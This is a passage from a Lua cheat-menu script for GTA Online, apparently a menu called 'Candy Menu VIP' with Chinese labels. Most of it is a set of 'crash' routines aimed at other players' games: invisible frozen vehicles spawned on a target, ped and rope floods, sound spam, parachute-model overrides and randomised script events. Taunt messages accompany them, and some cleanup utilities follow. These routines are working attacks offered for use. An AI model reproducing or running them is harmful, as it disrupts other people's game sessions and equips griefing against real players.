            SpawnedVehicleList1[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
			ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList1[i], true)
			ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList1[i], false, 0)
            util.yield(50)
        end
        util.yield(2000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnedVehicleList1[i])
        end

        util.yield(1000)
        SpawnedVehicleList2 = { };
		for i = 1, 50 do
			local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true);
            SpawnedVehicleList2[i] = CreateVehicle(util.joaat("chernobog"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
			ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicleList2[i], true)
			ENTITY.SET_ENTITY_VISIBLE(SpawnedVehicleList2[i], false, 0)
            util.yield(50)
        end
        util.yield(2000)
        for i = 1, 50 do
            entities.delete_by_handle(SpawnedVehicleList2[i])
        end

        menu.trigger_commands("anticrashcam off")
    end
	end)
	
	    menu.action(CrashMenu, "无效衣服崩溃", {}, "",  function()
		menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID();
        local Spawned_Mike = CreatePed(26, util.joaat("player_zero"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
        for i = 0, 500 do
            PED.SET_PED_COMPONENT_VARIATION(Spawned_Mike, 0, 0, math.random(0, 10), 0)
			ENTITY.SET_ENTITY_COORDS(Spawned_Mike, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, true, false, false, true);
            util.yield(10)
        end
        entities.delete_by_handle(Spawned_Mike)
        menu.trigger_commands("anticrashcam off")
    end)

	
    menu.action(CrashMenu, "维德崩溃", {}, "", function()
        menu.trigger_commands("anticrashcam on")
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        local SpawnPed_Wade = { }
        for i = 1, 60 do
            SpawnPed_Wade[i] = CreatePed(26, util.joaat("ig_wade"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
            util.yield(1)
        end
        util.yield(5000)
        for i = 1, 60 do
            entities.delete_by_handle(SpawnPed_Wade[i])
        end
        menu.trigger_commands("anticrashcam off")
    end)


    menu.action(CrashMenu, "拖车崩溃", {}, "", function()
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
		SpawnedDune1 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune1, true)
		SpawnedDune2 = CreateVehicle(util.joaat("dune"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedDune2, true)
		SpawnedBarracks1 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks1, true)
		SpawnedBarracks2 = CreateVehicle(util.joaat("barracks"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks2, true)
		SpawnedTowtruck = CreateVehicle(util.joaat("towtruck2"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedTowtruck, true)
		SpawnedBarracks31 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks31, true)
		SpawnedBarracks32 = CreateVehicle(util.joaat("barracks3"), TargetPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedBarracks32, true)

		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks31, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks32, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedBarracks2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune1, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
		ENTITY.ATTACH_ENTITY_TO_ENTITY(SpawnedDune2, SpawnedTowtruck, 0, 0, 0, 0, 0, 0, 0, true, true, true, false, 0, true)
        for i = 0, 100 do
            TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SpawnedTowtruck, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)
            util.yield(10)
        end
        util.yield(2000)
        entities.delete_by_handle(SpawnedTowtruck)
        entities.delete_by_handle(SpawnedDune1)
        entities.delete_by_handle(SpawnedDune2)
        entities.delete_by_handle(SpawnedBarracks31)
        entities.delete_by_handle(SpawnedBarracks32)
        entities.delete_by_handle(SpawnedBarracks1)
        entities.delete_by_handle(SpawnedBarracks2)
    end)
	
	menu.action(CrashMenu, "主机崩溃", {}, "",function()
	local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    menu.trigger_commands("tpmazehelipad")
	ENTITY.SET_ENTITY_COORDS(self_ped, -6170, 10837, 40, true, false, false)
	util.yield(1000)
    menu.trigger_commands("tpmazehelipad")
end)
	
	menu.click_slider(CrashMenu, "声音崩溃" , {}, "崩溃其他玩家游戏",1, 2, 1, 1, function(on_change)
	if on_change == 1 then
		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
            local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', true, 10000, false)
            end
            util.yield()
        end
	end
	if on_change == 2 then
	    local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 1000
        while time > util.current_time_millis() do
        local pos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
        for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, 'Object_Dropped_Remote', pos.x,pos.y,pos.z, 'GTAO_FM_Events_Soundset', true, 10000, false)
        end
        util.yield()
		end
    end
	end)
	
	menu.action(CrashMenu, "美杜莎", {}, "", function ()
	
	MDS(pid)
	
	end)
	
	menu.action(CrashMenu, "载具动作崩溃", {}, "崩溃绿玩或外置菜单（2-10S生效）", function()
	      local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		  local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
		  pos.z = pos.z + 10
		  veh = entities.get_all_vehicles_as_handles()
		  
        for i = 1, #veh do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], pos.x,pos.y,pos.z, ENTITY.GET_ENTITY_HEADING(TPP), 10)
        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 18, 999)
        TASK.TASK_VEHICLE_TEMP_ACTION(TPP, veh[i], 16, 999)
		end
	end)
    
	
	
	menu.action(CrashMenu, "富兰克林崩溃", {}, "崩溃绿玩或不那么昂贵的菜单", function()
	    util.toast("The crash has started. Please stay away from the player and do not watch the player")
		menu.trigger_commands("anticrashcam on")
		local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		local pos = ENTITY.GET_ENTITY_COORDS(TPP, true)
		for i = 0 , 30 do 
			invalidpeda1 = CreatePed(26, util.joaat("player_one"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
			ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
			util.yield(1)
		end
		util.yield(1)
		for i = 0 , 30 do 
			invalidpeda2 = CreatePed(26, util.joaat("player_one"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
			ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
			util.yield(1)
		end
		util.yield(1)
		for i = 0 , 50 do 
			invalidpeda3 = CreatePed(26, util.joaat("player_one"), pos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed))
			ENTITY.SET_ENTITY_INVINCIBLE(invalidpeda, true)
			util.yield(1)
		end
		util.yield(5000)
		util.yield(300)
		notification("崩溃完成，等待删除PED",colors.red)
		util.yield(300)
		local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
		notification("done",colors.red)
		util.yield(300)
		menu.trigger_commands("anticrashcam off")
	end)
	
end
    
	
local InitialPlayersList = players.list(true, true, true)
for i=1, #InitialPlayersList do
	GenerateFeatures(InitialPlayersList[i])
end

--players.on_join(GenerateFeatures)

local resolves = {
	"ez",
	"didn't stand a chance",
    "Crash addiction satisfied"
}

function Crash(pid) 
	for i,v in ipairs(crashes) do
		par1 = math.random(-100000, 99999999)
		par2 = math.random(-4827432, 3231229)
		par3 = math.random(46190868, 999999999)
		par4 = math.random(-133223, 42746729)
		par5 = math.random(-999999999, 428747628)
		send_script_event(v, pid, {pid, par1, par2, par3, par4, par5})
		util.yield()
	end
end


drift = false
function drift(toggle)

	if drift then
		while true do
			local veh = entities.get_user_vehicle_as_handle()
			if veh then
				if PAD.IS_CONTROL_PRESSED(1, 61) then
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, true)
				else
					VEHICLE.SET_VEHICLE_REDUCE_GRIP(veh, false)
				end
			end        
			util.yield()
		end
	end
end

selectedplayer = {}
for b = 0, 32 do
    selectedplayer[b] = false
end
excludeselected = false

cmd_id = {}
for a = 0, 32 do
	cmd_id[a] = 0
end

attachspam = {}
for a = 0, 32 do
	attachspam[a] = 0
end

local enablechatjudge = true
local crashdtc, kickdtc, crashdtc2, kickdtc2, crashdtc3, kickdtc4
local crashdtcbeg, kickdtcbeg = true, false



local attachvehstest = {
	"adder",
	"zentorno"
}

local attachvehs = {
	"adder",
	"zentorno",
	"buzzard",
	"bullet",
	"frogger",
	"blista",
	"cargobob",
	"dinghy",
	"dilettante",
	"asterope",
	"banshee",
	"krieger",
	"insurgent2",
	"patriot2",
	"starling",
	"nimbus",
	"bus",
	"titan",
	"shamal",
	"luxor",
	"duster",
	"molotok",
	"bombushka",
	"xls2",
	"zorusso",
	"jetmax",
	"dump",
	"kosatka",
	"cargoplane",
	"stockade",
	"rhino"
}

local bigvehs = {
	"volatol",
	"bombushka",
	"kosatka",
	"cargoplane",
	"alkonost",
	"rhino",
	"blimp",
	"blimp2",
	"bus",
	"jet",
	"luxor2"
}

local volatols = {
	"volatol"
}

local bombushkas = {
	"bombushka"
}

local kosatkas = {
	"kosatka"
}

local cargoplanes = {
	"cargoplane"
}

local alkonosts = {
	"alkonost"
}

local planes = {
	"luxor",
	"alphaz1",
	"avenger",
	"besra",
	"blimp",
	"blimp2",
	"cuban800",
	"dodo",
	"duster",
	"howard",
	"hydra",
	"jet",
	"lazer",
	"luxor2",
	"mammatus",
	"mijet",
	"molotok",
	"nokota",
	"pyro",
	"shamal"
}

util.create_tick_handler(function()
    VEHICLE.SET_VEHICLE_GRAVITY(veh, not is_vehicle_flying)
    if is_vehicle_flying then do_vehicle_fly() else ENTITY.SET_ENTITY_COLLISION(veh, true, TRUE) end
    return true
end)
util.on_stop(function()
    VEHICLE.SET_VEHICLE_GRAVITY(veh, true)
	ENTITY.SET_ENTITY_COLLISION(veh, true, true)
    sf:delete()
end)

	local welcometitle = divider(mroot(), "Welcome to Candy Menu VIP")
	local lists = mlist(mroot(), "悬赏选项", {}, "")
	local move = mlist(mroot(), "移动选项", {}, "")
	local weapons = mlist(mroot(), "武器选项", {}, "")
	local vehicleset = mlist(mroot(), "载具选项", {}, "")
	local allmenu = mlist(mroot(), "全局选项", {}, "")
	local scriptevent = mlist(mroot(), "事件选项", {}, "")
	local lpidspawn = mlist(mroot(), "生成选项", {}, "")
	local saved = mlist(lpidspawn, "预设", {}, "")
	local world = mlist(mroot(), "世界选项", {}, "")
	local online = mlist(mroot(), "活动选项", {}, "")
	local fixgame = mlist(mroot(), "修复选项", {}, "")
	local newbeta = mlist(mroot(), "开发选项", {}, "")
	custselc = menu.list(menu.my_root(), "崩溃选项", {}, "", function(); end)
	local antiset = mlist(mroot(), "防护选项", {}, "")
	
	menu.divider(custselc, "全局崩溃")

	menu.action(custselc, "载具伞崩", {}, "", function ()
        local SelfPlayerPed = PLAYER.PLAYER_PED_ID()
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        for i = 1, 20 do
            local SelfPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
            local Ruiner2 = CreateVehicle(util.joaat("Ruiner2"), SelfPlayerPos, ENTITY.GET_ENTITY_HEADING(TargetPlayerPed), true)
            PED.SET_PED_INTO_VEHICLE(SelfPlayerPed, Ruiner2, -1)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Ruiner2, SelfPlayerPos.x, SelfPlayerPos.y, 1000, false, true, true)
            util.yield(200)
            VEHICLE._SET_VEHICLE_PARACHUTE_MODEL(Ruiner2, util.joaat("prop_beach_parasol_05"))
            VEHICLE._SET_VEHICLE_PARACHUTE_ACTIVE(Ruiner2, true)
            util.yield(200)
            entities.delete_by_handle(Ruiner2)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end)

	
	
	menu.action(custselc, "人物伞崩", {}, "", function()
        local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
        for n = 0 , 3 do
            local object_hash = util.joaat("prop_logpile_06b")
            STREAMING.REQUEST_MODEL(object_hash)
              while not STREAMING.HAS_MODEL_LOADED(object_hash) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)

            local object_hash2 = util.joaat("prop_beach_parasol_03")
            STREAMING.REQUEST_MODEL(object_hash2)
              while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
               util.yield()
            end
            PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
            util.yield(1000)
            for i = 0 , 20 do
                PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
            end
            util.yield(1000)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
        end
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
    end)
	
	

	
	
	menu.action(custselc,"美国崩溃",{},"",function()
    		for n = 0 , 5 do
    			PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
    			object_hash = 1117917059
    			            		    	STREAMING.REQUEST_MODEL(object_hash)
    	      while not STREAMING.HAS_MODEL_LOADED(object_hash) do
    		       util.yield()
    	         end
    			PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
    			util.yield(1000)
    			for i = 0 , 20 do
    			PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    			end
    			util.yield(1000)
    			menu.trigger_commands("tplsia")
    			bush_hash = -908104950
    			            		    	STREAMING.REQUEST_MODEL(bush_hash)
    	      while not STREAMING.HAS_MODEL_LOADED(bush_hash) do
    		       util.yield()
    	         end
    		    PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),bush_hash)
    			ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
                WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
               	util.yield(1000)
    			for i = 0 , 20 do
    			PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
    		    end
    			util.yield(1000)
    			menu.trigger_commands("tplsia")
    	end
    end)
	
		menu.action(custselc, "牵引崩溃", {}, "", function()
	   local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local playpos = ENTITY.GET_ENTITY_COORDS(cspped, true)

        playpos.x = playpos.x + 10

        local carc = CreateVehicle(2598821281, playpos, ENTITY.GET_ENTITY_HEADING(cspped), true)
        local carcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)
        local pedc = CreatePed(26, 2597531625, playpos, 0)
        local pedcPos = ENTITY.GET_ENTITY_COORDS(vehicle, true)

        local ropec = PHYSICS.ADD_ROPE(playpos.x, playpos.y, playpos.z, 0, 0, 0, 1, 1, 0.00300000000000000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, 0)
        PHYSICS.ATTACH_ENTITIES_TO_ROPE(ropec,carc,pedc,carcPos.x, carcPos.y, carcPos.z ,pedcPos.x, pedcPos.y, pedcPos.z,2, false, false, 0, 0, "Center","Center")
        util.yield(2500)
        PHYSICS.DELETE_CHILD_ROPE(ropec)
        entities.delete_by_handle(carc)
        entities.delete_by_handle(pedc)
		notification("Done!" ,colors.red)
    end)

	menu.action(custselc, "平台崩溃", {}, "崩完切战局(可能会导致战局损坏)", function()
		--local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
        --local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped)
		--ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)
		menu.trigger_commands("blockentityspam off")
		menu.trigger_commands("anticrashcamera on")
		util.yield(1000)
		local gridSize = 30 -- 平台大小
		local offset = 130 -- 偏移量
		for i = 1, gridSize do
			for j = 1, gridSize do
				local c = {}
				c.x = (i - 1) * offset - (gridSize / 2 - 0.5) * offset
				c.y = (j - 1) * offset - (gridSize / 2 - 0.5) * offset
				c.z = 500
				request_model_load(1054678467)
				island_block = entities.create_object(1054678467, c)
				util.yield()
			end
		end
		util.yield(500)
		util.toast("Done :)")
		menu.trigger_commands("anticrashcamera off")
		menu.trigger_commands("blockentityspam on")
	end)

	menu.action(custselc,"声音崩溃V1", {}, "", function()
	    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
		local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
		end
		notification("Done!" ,colors.red)
	end)

	menu.action(custselc,"声音崩溃V2", {}, "", function()
	    local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
		local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
				AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
			for i = 1, 20 do
			AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
			end
			util.yield()
		end
		notification("Done!" ,colors.red)
	end)
	
	protex = menu.list(menu.my_root(), "移除选项", {}, "", function(); end)
	
	menu.action(protex, "强制停止所有声音", {"stopsounds"}, "", function()
		for i=-1,100 do
			AUDIO.STOP_SOUND(i)
			AUDIO.RELEASE_SOUND_ID(i)
		end
	end)

	menu.action(protex, "移除附加物", {""}, "", function()
		notification("Removing Attachments", colors.black)
		if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
			menu.trigger_commands("mpmale")
		else
			menu.trigger_commands("mpfemale")
		end
	
	end)

	menu.click_slider(protex,"清理实体", {""}, "1 = NPC, 2 = 载具, 3 = 实体, 4 = 拾取物, 5 =所有", 1, 5, 1, 1, function(on_change)
		if on_change == 1 then
			local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
			notification(count .. "NPC清除完成", colors.green)
		end
		if on_change == 2 then
			local count = 0
			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end
			notification(count .. "载具清除完成", colors.green)
			return
		end
		if on_change == 3 then
			local count = 0
			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. "实体已清除", colors.green)
			return
		end
		if on_change == 4 then
			local count = 0
			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. " pickups have been yeeted", colors.green)
			return
		end
		if on_change == 5 then
			local count = 0
			for k,ent in pairs(entities.get_all_peds_as_handles()) do
				if not PED.IS_PED_A_PLAYER(ent) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k, ent in pairs(entities.get_all_vehicles_as_handles()) do
				local PedInSeat = VEHICLE.GET_PED_IN_VEHICLE_SEAT(ent, -1, false)
				if not PED.IS_PED_A_PLAYER(PedInSeat) then
					ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
					entities.delete_by_handle(ent)
					util.yield()
					count = count + 1
				end
			end

			for k,ent in pairs(entities.get_all_objects_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
		


			for k,ent in pairs(entities.get_all_pickups_as_handles()) do
				ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
				entities.delete_by_handle(ent)
				count = count + 1
				util.yield()
			end
			notification(count .. "清理完成", colors.green)
			return
		end
	end)

	menu.action(protex, "超级清", {"清除区域"}, "清除一切", function(on_click)
		local ct = 0
		notification("什么都没了啦!", colors.black)
